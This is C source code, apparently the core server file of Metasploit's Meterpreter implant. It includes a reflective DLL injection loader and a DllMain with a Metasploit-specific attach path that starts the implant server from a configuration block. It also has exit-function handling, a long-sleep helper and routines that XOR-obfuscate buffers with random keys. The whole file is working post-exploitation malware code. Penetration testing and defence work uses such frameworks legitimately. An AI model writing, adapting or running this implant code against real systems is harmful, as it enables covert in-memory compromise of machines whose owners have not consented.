#include "metsrv.h"

#include <windows.h> // for EXCEPTION_ACCESS_VIOLATION
#include <excpt.h>

#define	UnpackAndLinkLibs(p, s)

#define InitAppInstance() { if( hAppInstance == NULL ) hAppInstance = GetModuleHandle( NULL ); }


#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#define RDIDLL_NOEXPORT
#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
#include "../ReflectiveDLLInjection/inject/src/GetProcAddressR.c"
#include "../ReflectiveDLLInjection/inject/src/LoadLibraryR.c"

DWORD Init(MetsrvConfig* metConfig)
{
	INIT_LOGGING(metConfig)

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();

	// In the case of metsrv payloads, the parameter passed to init is NOT a socket, it's actually
	// a pointer to the metserv configuration, so do a nasty cast and move on.
	dprintf("[METSRV] Getting ready to init with config %p", metConfig);
	DWORD result = server_setup(metConfig);

	dprintf("[METSRV] Exiting with %08x", metConfig->session.exit_func);

	// We also handle exit func directly in metsrv now because the value is added to the
	// configuration block and we manage to save bytes in the stager/header as well.
	switch (metConfig->session.exit_func)
	{
	case EXITFUNC_SEH:
		SetUnhandledExceptionFilter(NULL);
		break;
	case EXITFUNC_THREAD:
		ExitThread(0);
		break;
	case EXITFUNC_PROCESS:
		ExitProcess(0);
		break;
	default:
		break;
	}
	return result;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;

	switch (dwReason)
	{
	case DLL_METASPLOIT_ATTACH:
		bReturnValue = Init((MetsrvConfig*)lpReserved);
		break;
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}

#define SLEEP_MAX_SEC (MAXDWORD / 1000)

/*!
 * @brief Returns a unix timestamp in UTC.
 * @return Integer value representing the UTC Unix timestamp of the current time.
 */
int current_unix_timestamp(void) {
	SYSTEMTIME system_time;
	FILETIME file_time;
	ULARGE_INTEGER ularge;

	GetSystemTime(&system_time);
	SystemTimeToFileTime(&system_time, &file_time);

	ularge.LowPart = file_time.dwLowDateTime;
	ularge.HighPart = file_time.dwHighDateTime;
	return (long)((ularge.QuadPart - 116444736000000000) / 10000000L);
}

/*!
 * @brief Sleep for the given number of seconds.
 * @param seconds DWORD value representing the number of seconds to sleep.
 * @remark This was implemented so that extended sleep times can be used (beyond the
 *         49 day limit imposed by Sleep()).
 */
VOID sleep(DWORD seconds)
{
	while (seconds > SLEEP_MAX_SEC)
	{
		Sleep(SLEEP_MAX_SEC * 1000);
		seconds -= SLEEP_MAX_SEC;
	}
	Sleep(seconds * 1000);
}

VOID xor_bytes(BYTE xorKey[4], LPBYTE buffer, DWORD bufferSize)
{
	dprintf("[XOR] XORing %u bytes with key %02x%02x%02x%02x", bufferSize, xorKey[0], xorKey[1], xorKey[2], xorKey[3]);
	for (DWORD i = 0; i < bufferSize; ++i)
	{
		buffer[i] ^= xorKey[i % 4];
	}
}

VOID rand_xor_key(BYTE buffer[4])
{
	static BOOL initialised = FALSE;
	if (!initialised)
	{
		srand((unsigned int)time(NULL));
		initialised = TRUE;
	}

	buffer[0] = (rand() % 254) + 1;
	buffer[1] = (rand() % 254) + 1;
	buffer[2] = (rand() % 254) + 1;
	buffer[3] = (rand() % 254) + 1;
}

BOOL is_null_guid(BYTE guid[sizeof(GUID)])
{
	return memcmp(guid, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", sizeof(GUID)) == 0 ? TRUE : FALSE;
}
